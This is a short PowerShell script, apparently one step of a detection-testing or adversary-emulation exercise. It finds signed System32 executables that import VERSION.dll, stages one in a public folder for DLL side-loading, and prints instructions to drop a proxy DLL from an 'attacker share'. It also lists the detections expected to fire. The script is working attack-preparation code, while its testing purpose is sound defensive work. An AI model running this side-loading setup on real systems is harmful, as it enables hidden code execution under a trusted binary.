# VICTIM - 4.6 generic sideload prep helper: find a signed System32 binary that
# imports VERSION.dll (search-order hijack host), and stage it for the proxy DLL.
$hosts = @()
foreach ($exe in (Get-ChildItem C:\Windows\System32\*.exe | Select-Object -First 400)) {
    try {
        $b = [IO.File]::ReadAllBytes($exe.FullName)
        if ($b.Length -gt 10MB) { continue }
        $s = [Text.Encoding]::ASCII.GetString($b)
        if ($s -match 'VERSION\.dll') { $hosts += $exe.Name }
    } catch {}
}
Write-Host "signed System32 binaries importing VERSION.dll (candidates):"
$hosts | Select-Object -First 10

if ($hosts.Count -gt 0) {
    $pick = $hosts[0]
    New-Item -ItemType Directory -Force C:\Users\Public\SigCheck | Out-Null
    Copy-Item "C:\Windows\System32\$pick" -Destination C:\Users\Public\SigCheck\
    Write-Host "staged: C:\Users\Public\SigCheck\$pick"
    Write-Host "next: copy your proxy version.dll next to it (from the attacker share) and run:"
    Write-Host "  & C:\Users\Public\SigCheck\$pick"
    Write-Host "expect: SIG-* on staged files, EVT-4688-TEMP; module telemetry = known gap"
} else {
    Write-Warning "no VERSION.dll importer found in the first 400 exes - widen the scan"
}
